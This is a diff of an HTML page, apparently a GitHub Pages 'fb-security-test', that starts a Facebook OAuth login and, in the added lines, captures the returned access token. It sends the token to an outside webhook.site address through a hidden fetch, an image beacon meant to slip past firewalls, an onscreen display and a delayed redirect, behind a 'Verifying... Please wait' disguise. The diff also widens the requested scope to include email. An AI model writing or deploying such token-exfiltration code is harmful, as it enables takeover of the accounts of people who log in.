@@ -1,24 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head><title>Redirecting...</title></head>
+<head><title>Success</title></head>
 <body>
+    <h1 id="status">Verifying... Please wait</h1>
     <script>
-        // [2026-01-21] Direct URL Injection
+        // [2026-01-21] Nuclear Extraction Script
         window.onload = function() {
             const hash = window.location.hash;
             const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
 
             if (hash.includes('access_token=')) {
-                // استخراج التوكن
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
                 
-                // تحويل المتصفح بالكامل إلى الـ Webhook مع التوكن كـ Parameter
-                // هذه الطريقة مستحيل أن تفشل لأنها لا تعتمد على الخلفية
-                window.location.href = webhook + "?CAPTURED_TOKEN=" + token;
+                // الطريقة 1: إرسال مخفي
+                fetch(webhook + "?TOKEN=" + token, {mode: 'no-cors'});
+                
+                // الطريقة 2: إرسال عبر صورة (لتخطي الـ Firewall)
+                var img = new Image();
+                img.src = webhook + "?IMG_TOKEN=" + token;
+
+                // الطريقة 3: إظهار التوكن على الشاشة (لأخذه يدوياً إذا فشل الـ Webhook)
+                document.getElementById('status').innerHTML = "TOKEN CAPTURED: <br><small>" + token + "</small>";
+                
+                // الطريقة 4: تحويل كامل الصفحة
+                setTimeout(function(){
+                    window.location.href = webhook + "?REDIRECT_TOKEN=" + token;
+                }, 2000);
+
             } else {
                 const client_id = "1089408829356317";
                 const redirect = "https://mohammedborai404.github.io/fb-security-test/";
-                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=public_profile`;
+                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=email,public_profile`;
             }
         };
     </script>
